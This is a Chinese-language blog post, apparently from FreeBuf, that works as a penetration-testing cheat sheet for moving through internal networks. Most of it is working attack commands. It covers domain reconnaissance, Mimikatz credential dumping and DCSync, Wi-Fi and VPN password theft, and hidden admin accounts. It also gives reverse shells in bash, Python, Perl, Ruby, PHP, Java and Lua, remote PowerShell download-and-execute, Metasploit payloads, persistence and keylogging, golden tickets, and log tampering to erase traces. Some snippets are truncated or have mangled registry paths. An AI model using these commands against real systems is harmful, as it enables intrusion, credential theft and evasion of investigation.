## **前言**

 **很早就想专门写一篇关于内网的文章，一直没有腾出空来，万万没想到，写下这篇文章的时候，竟然是我来某实验室实习的时间段:)**

##  **信息搜集**

 **nmap扫描实时存活的ip**

    
    
    nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips
    

### **常用命令**

    
    
    ipsping          icmp连通性
    nslookup www.baidu.com vps-ip dns连通性
    dig @vps-ip www.baidu.com
    curl vps:8080  http连通性
    tracert
    bitsadmin /transfer n http://ip/xx.exe C:\windows\temp\x.exe一种上传文件 >=2008
    fuser -nv tcp 80 查看端口pid
    rdesktop -u username ip linux连接win远程桌面 (有可能不成功)
    where file win查找文件是否存在 
    找路径，Linux下使用命令find -name *.jsp来查找，Windows下，使用for /r c:\windows\temp\ %i in (file lsss.dmp) do @echo %i
    netstat -apn | grep 8888   kill -9 PID   查看端口并kill
    query user || qwinsta 查看当前在线用户
    net user  查看本机用户
    net user /domain 查看域用户
    net view & net group "domain computers" /domain 查看当前域计算机列表 第二个查的更多
    net view /domain 查看有几个域
    net view \\dc   查看dc域内共享文件
    net group /domain 查看域里面的组
    net group "domain admins" /domain 查看域管
    net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管
    net group "domain controllers" /domain 域控
    net time /domain 
    net config workstation   当前登录域 - 计算机名 - 用户名
    net use \\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源
    ipconfig 
    systeminfo 查看系统信息
    tasklist /svc
    tasklist /S ip /U domain\username /P /V 查看远程计算机tasklist
    net localgroup administrators && whoami 查看当前是不是属于管理组
    netstat -ano
    nltest /dclist:xx  查看域控
    dsquery
    whoami /all 查看Mandatory Label uac级别和sid号
    net sessoin 查看远程连接session(需要管理权限)
    net share     共享目录
    cmdkey /l   查看保存登陆凭证
    echo %logonserver%  查看登陆域
    spn –l administrator spn记录
    set  环境变量
    dsquery server - 查找目录中的 AD DC/LDS 实例
    dsquery user - 查找目录中的用户
    dsquery computer 查询所有计算机名称windows 2003
    dir /s *.exe 查找指定目录下及子目录下没隐藏文件
    arp -a 获取arp表
    

### **脚本收集域信息**

使用`ntdsxtract`提取域信息

    
    
    git clone https://github.com/csababarta/ntdsxtract.git  python setup.py build && python setup.py install
    

### **使用被攻击主机CMD扫描存活ip**

    
    
    for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.1.%P | findstr "TTL ="
    

### **文件信息搜集**

ExifTool可读写及处理图像、视频及音频，例如Exif、IPTC、XMP、JFIF、GeoTIFF、ICC
Profile。包括许多相机的制造商信息读取，如佳能，卡西欧，大疆，FLIR，三星等。

    
    
    exiftool ‐lang zh‐cn ‐a ‐u ‐g1 ./55e736d12f2eb9385716e 513d8628535e4dd6fdc.jpg
    

Micropoor:"目标资产信息搜集的程度，决定渗透过程的复杂程度。 目标主机信息搜集的深度，决定后渗透权限持续把控。
渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。"

###  **密码凭证获取**

 **提取 KRBTGT用户帐户的密码数据：**

    
    
    Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt"exit
    

**管理员用户帐户提取密码数据：**

    
    
    Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator" exit
    

**发现远程登录密码等密码 netpass.exe**

下载`[<https://www.nirsoft.net/utils/network_password_recovery.html>](<https://www.nirsoft.net/utils/network_password_recovery.html>)`

 **获取window vpn密码：**

    
    
    mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit
    

**wifi密码：**

    
    
    netsh wlan show profile 查处wifi名下一条命令用 netsh wlan show profile WiFi-name key=clear
    

**ie代理**

    
    
    reg query "HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings" /v ProxyServer
    reg query "HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet Settings"
    

**pac代理**

    
    
    reg query "HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings" /v AutoConfigURL //引 t0stmail
    

### **用户操作**

 **添加user**

    
    
    net user admin1 admin1 /add & net localgroup administrators admin1 /add
    

如果不允许远程连接，修改注册表

    
    
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  
    REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
    

如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许3389端口，命令如下:

    
    
    netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
    

**关闭防火墙**

    
    
    netsh firewall set opmode mode=disable
    

**添加隐藏账户**

 **开启sys权限cmd**

    
    
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'nt authority\system'
    

**添加用户并隐藏**

    
    
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1')
    

## 反弹shell和端口转发

###  **Lnuix 反弹shell**

 **Bash**

    
    
    bash -i>& /dev/tcp/192.168.146.129/2333 0>&1
    bash -i >& /dev/tcp/192.168.146.129/2333 <&2
    exec 5<>/dev/tcp/192.168.146.129/2333;cat <&5|while read line;do $line >&5 2>&amp1done
    nc 192.168.31.174 8080 -t -e /bin/bash
    

**简单解释下** ：

`bash -i 打开一个交互的bash`

`>&将标准错误输出重定向到标准输出`

`/dev/tcp/x.x.x.x/port 意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口`

`0>&1 <span style="color: rgb(51, 51, 51);">
标准输入重定向到标准输出，实现你与反弹出来的shell的交互</span>`

 **telnet反弹**

攻击者主机上打开两个终端分别执行监听：

    
    
    nc -lvvp 4444
    
    nc -lvvp 5555
    

目标主机中执行：

    
    
    telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555
    

监听两个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip

反弹shell成功后，在监听4444端口的终端中执行命令可以在另一个终端中看到命令执行结果。

另一个版本：

    
    
    rm -f /tmp/p; mknod /tmp/p p && telnet x.x.x.x 4444 0/tmp/p
    

**Netcat without -e #1**

    
    
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
    

**Netcat without -e #2**

    
    
    nc localhost 443 | /bin/sh | nc localhost 444
    telnet localhost 443 | /bin/sh | telnet localhost 444
    

**XTerm**

    
    
    xterm -display 10.0.0.1:1
    

**JDWP RCE**

    
    
    print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("whoami").getInputStream())).readLine())
    

**Working with Restricted Shells**

    
    
    print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java
    

### **常见脚本反弹：**

 **1\. Python**

    
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
    

**2\. Perl**

方法一：

    
    
    perl -e 'use Socket;$i="x.x.x.x";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    

方法二：

    
    
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:5555");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    

**3\. Ruby**

方法一：

    
    
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x","5555");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
    

方法二：

    
    
    ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    

**4\. PHP**

    
    
    php -r '$sock=fsockopen("x.x.x.x",5555);exec("/bin/bash -i <&3 >&3 2>&3");'
    

**5\. Java**

    
    
        public class Revs {
        /**
        * @param args
        * @throws Exception 
        */
        public static void main(String[] args) throws Exception {
            // TODO Auto-generated method stub
            Runtime r = Runtime.getRuntime();
            String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/x.x.x.x/5555;cat <&5 | while read line; do $line 2>&5 >&amp5 done"};
            Process p = r.exec(cmd);
            p.waitFor();
        }
    }
    

**6\. Lua**

    
    
    lua -e "require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i <&3 >&3 2>&3');"
    

**端口转发**

    
    
    被攻击机 lcx.exe -slave 139.1.2.3 8888 10.48.128.25 3389
    vps      lcx.exe –listen 8888 5555
    

**netsh win自带(只支持tcp)**

    
    
    netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.1.101 connectport=8080
    

将本地80转到192.168.1.101:8080端口

    
    
    netsh interface portproxy add v4tov4 listenaddress=1.1.1.101 listenport=8082 connectaddress=192.168.2.102 connectport=3389
    

通过连接1.1.1.101的8082端口，相当连接1.1.1.101可访问的内网192.168.2.102的3389端口

portfwd是一款强大的端口转发工具，支持TCP，UDP，支持IPV4--IPV6的转换转发。并且
内置于meterpreter。其中exe单版本源码如下：`[<https://github.com/rssnsj/portfwd>](<https://github.com/rssnsj/portfwd>)`

攻击机执行

    
    
     portfwd add ‐l 33389 ‐r 192.168.1.119 ‐p 3389 
     portfwd add ‐l 30080 ‐r 192.168.1.119 ‐p 80
    

分别访问攻击机`33389，30080`，既等价访问靶机`3389，80`

##  **提权小结**

####  **常用exp：**

    
    
    https://github.com/SecWiki/windows-kernel-exploits 
    https://github.com/WindowsExploits/Exploits 
    https://github.com/AusJock/Privilege-Escalation
    

**linux提权辅助脚本**

    
    
    https://github.com/jondonas/linux-exploit-suggester-2
    

**windows提权辅助脚本**

    
    
    https://github.com/Ethancck/Windows-Exploit-Suggester
    

## Msf相关

 **linux相关payload：**

    
    
        linux/x86/meterpreter/reverse_tcp
        linux/x86/meterpreter/bind_tcp
        linux/x86/shell_bind_tcp
        linux/x86/shell_reverse_tcp
        linux/x64/shell/bind_tcp
        linux/x64/shell/reverse_tcp
        linux/x64/shell_bind_tcp
        linux/x64/shell_bind_tcp_random_port
        linux/x64/shell_reverse_tcp
    

**windows相关payload:**

    
    
        windows/meterpreter/reverse_tcp
        windows/meterpreter/bind_tcp
        windows/meterpreter/reverse_hop_http
        windows/meterpreter/reverse_http
        windows/meterpreter/reverse_http_proxy_pstore
        windows/meterpreter/reverse_https
        windows/meterpreter/reverse_https_proxy
        windows/shell_reverse_tcp
        windows/shell_bind_tcp
        windows/x64/meterpreter/reverse_tcp
        windows/x64/meterpreter/bind_tcp
        windows/x64/shell_reverse_tcp
        windows/x64/shell_bind_tcp
    

目标服务器为64位用x64监听，反弹meterpreter用含有meterpreter的模块，反弹普通的shell（例如nc），shell_reverse_tcp模块监听

例如msf:

    
    
    反弹shell  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe 
    监听       windows/meterpreter/reverse_tcp
    
    反弹shell  nc -e cmd.exe ip port 
    监听       windows/shell_reverse_tcp
    

meterpreter下上传 upload file 下载 download file

###  **Msf进程注入(win2008 成功)**

    
    
    meterpreter > getuid
    Server username: xxxx
    meterpreter > getpid
    Current pid: 3456
    meterpreter > ps
    
    Process List
    ============
     PID   PPID  Name                       Arch  Session  User          Path
    ---   ----  ----                       ----  -------  ----          ----     12000  676  shell.exe                  x86   2        xxx  C:\Users\xxx\Desktop\shell.exe
     676  1124  explorer.exe               x64   2        xxx  C:\Windows\explorer.exe
    
    meterpreter > migrate 676
    [*] Migrating from 12000 to 676...
    [*] Migration completed successfully.
    

### **Msf hash**

    
    
    meterpreter > run hashdump 需要sys权限 导出SAM
    
    meterpreter > run post/windows/gather/smart_hashdump 需要sys权限
    
    getsystem存在uac，用msf bypass，但特征明显 meterpreter > search bypassuac
    
    msf powerdump load mimikatz 不太好用
    

### **Msf的持续后门**

Persistence: run persistence -h：用于创建启动项启动，会创建注册表，创建文件。（X86_Linux不支持此脚本）

    
    
    run persistence -U -i 10 -p 10390 -r free.ngrok.cc
    

使用powershell执行也被监控而被360拦截

meterpreter 的 run getgui -e 命令可以开启成 功。360会提示阻止

Run metsvc -h ：用于创建服务，会创建meterpreter服务，并上传三个文件，使用-r参数可以卸载服务 ，被拦

###  **Msf powershell**

    
    
    meterpreter > load powershell
    meterpreter > powershell_shell
    PS > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');
    Ps > Invoke-Mimikatz -DumpCreds
    

### **Msf Router**

2个或多个路由之间，没有配置相应的路由表，不能访问，获得一台机器shell session 添加路由，使msf可以在当前shell
session下以被攻击机访问其他内网主机.

    
    
    meterpreter > run get_local_subnets 
        [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
        [!] Example: run post/multi/manage/autoroute OPTION=value [...]
        Local subnet: 172.17.0.0/255.255.0.0
    meterpreter > run autoroute -s 172.17.0.0/16  添加路由
    meterpreter > run autoroute -p                查看路由
    meterpreter > run autoroute -d -s 172.17.0.0/16  删除
    

### **键盘记录**

Msf键盘记录在windows不会创建新进程

    
    
    meterpreter > keyscan_start meterpreter > keyscan_dump meterpreter > keyscan_stop
    

### **Payload下载(windows)**

自windows7 以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自 动重试，在比较复杂的网络环境下，有着不错的性能。

    
    
    bitsadmin /rawreturn /transfer down "[http://vps/hello.php](http://vps/hello.php)" G:\text\hello.php
    

![1.png](https://image.3001.net/images/20190803/1564824381_5d45533de6276.png!small)

### **mimikatz 和procdump 获得内存 hash**

如果服务器是64位，要把`Mimikatz`进程迁移到一个64位的程序进程中，才能查看64位系统密码明文。32位任意

运行`procdump.exe -accepteula -ma lsass.exe
lsass.dmp`(管理权限)后lsass.dmp放到mimikatz.exe同目录，运行以下命令

    
    
    mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
    

导出当前 内存 hash，需要免杀过av等

    
    
    mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
    powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
    

`Windows Server 2012`,部分`Windows Server 2008`默认无法使用`mimikatz`导出明文口令

###  **黄金票据(维持权限)**

 **域用户sid**

    
    
    whoami /all
    

**krbtgt hash**

    
    
    mimikatz "lsadump::dcsync /domain:xx.com /user:krbtgt"
    

域管 `net group "domain admins" /domain` 这里的是`administrator`

    
    
    mimikatz "kerberos::purge""kerberos::golden /admin:administrator /domain:xx.com /sid:S-1-5-..... /krbtgt:hash /ticket:Adminstrator.kiribi""kerberos::ptt Administrator.kiribi""kerberos::tgt"
    

## **痕迹擦除**

在渗透中，想要不留痕迹的(当然这是很难的)，就要对自己的留下的痕迹进行擦除，这里以Lniux为例。

###  **Linux痕迹清除**

 **Apache日志**

Apache主要的日志就是`access.log``error_log`，前者记录了HTTTP的访问记录，后者记录了服务器的错误日志。这些都可以在httpd.conf中找到。

明文的Apache文件，通过正则表达式就可以搞定：

    
    
    sed –i 's/192.168.1.3/192.168.1.4/g' /var/log/apache/ access.logsed –i 's/192.168.1.3/192.168.1.4/g' /var/log/apache/error_log
    

其中192.168.1.3是我们的IP，192.168.1.4使我们伪造的IP。在正则表达式中有特殊的含义，所以需要用“”来进行转义。

 **MySQL日志文件**

    
    
    log-error=/var/log/mysql/mysql_error.log #错误日志
    log=/var/log/mysql/mysql.log#最好注释掉，会产生大量的日志，包括每一个执行的sql及环境变量的改变等等
    log-bin=/var/log/mysql/mysql_bin.log # 用于备份恢复，或主从复制.这里不涉及。
    log-slow-queries=/var/log/mysql/mysql_slow.log #慢查询日志
    log-error=/var/log/mysql/mysqld.log
    pid-file=/var/run/mysqld/mysqld.pid
    

执行下述命令清除即可

    
    
    sed –i 's/192.168.1.3/192.168.1.4/g'/var/log/mysql/mysql_slow.log
    

至于二进制日志文件，需要登录mysql client来修改删除，建议这种操作最先执行。

 **php日志修改**

    
    
    sed –i 's/192.168.1.3/192.168.1.4/g'/var/log/apache/php_error.log
    

**Linux日志清除**

这个比较多，记录的也比较复杂，测试环境是CentOS 6.3。只把和渗透有关的文件列出来，主要在`/etc/logrotate.d/syslog`中

`/var/log/maillog`，该日志文件记录了每一个发送到系统或从系统发出的电子邮件的活动，它可以用来查看用户使用哪个系统发送工具或把数据发送到哪个系统

`var/log/messages`，该文件的格式是每一行包含日期、主机名、程序名，后面是包含PID或内核标识的方括号，一个冒号和一个空格

`/var/log/wtmp`，该日志文件永久记录每个用户登录、注销及系统的启动，停机的事件。该日志文件可以用来查看用户的登录记录，last命令就通过访问这个文件获得这些信息，并以反序从后向前显示用户的登录记录，last也能根据用户，终端tty或时间显示相应的记录

`/var/run/utmp`，该日志文件记录有关当前登录的每个用户的信息，因此这个文件会随着用户登录和注销系统而不断变化，它只保留当时联机的用户记录，不会为用户保留永久的记录。系统中需要查询当前用户状态的程序，如who、w、users、finger等就需要访问这个文件

`/var/log/xferlog`，该日志文件记录FTP会话，可以显示出用户向FTP服务器或从服务器拷贝了什么文件。该文件会显示用户拷贝到服务器上的用来入侵服务器的恶意程序，以及该用户拷贝了哪些文件供他使用。

`bash_history`，这是bash终端的命令记录，能够记录1000条最近执行过的命令（具体多少条可以配置），通过这个文件可以分析此前执行的命令来知道知否有入侵者，每一个用户的home目录里都有这么一个文件

>
> ****安利的脚本：<https://github.com/JonGates/jon>](<https://github.com/JonGates/jon>
> ****``

##  **后言**

渗透是一门艺术，外练一口气，内练筋骨皮，时常巩固自己的知识体系，才能站在渗透的一线。最后向发扬分享精神的Micropoor致敬！贴出大佬的github：

>
> <https://github.com/Micropoor/Micro8>](<https://github.com/Micropoor/Micro8>``

 ***本文原创作者：cck，本文属FreeBuf原创奖励计划，未经许可禁止转载**

